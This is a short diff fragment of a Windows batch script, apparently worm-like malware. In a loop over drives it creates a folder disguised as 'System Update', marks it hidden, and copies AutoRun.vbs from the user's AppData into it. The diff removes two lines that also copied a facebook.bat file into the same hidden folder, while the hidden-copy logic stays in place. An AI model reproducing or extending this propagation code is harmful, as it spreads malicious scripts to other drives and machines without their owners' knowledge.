@@ -324,7 +324,6 @@ echo *************DOWNLOAD file****************
 			  mkdir "%%i\System Update" > nul 2> nul
 			  attrib +h "%%i\System Update" /s /d
                           copy "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
-                          copy "C:\Users\%username%\AppData\Roaming\facebook.bat" "%%i\System Update\facebook.bat" /Y > nul 2> nul
 			  echo Copied!
 			  ) 
 		   )
@@ -367,7 +366,6 @@ echo *************DOWNLOAD file****************
 			  mkdir "%%i\System Update" > nul 2> nul
 			  attrib +h "%%i\System Update" /s /d
                           copy "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
-                          copy "C:\Users\%username%\AppData\Roaming\facebook.bat" "%%i\System Update\facebook.bat" /Y > nul 2> nul
 			  echo Copied!
 			  ) 
 		   )
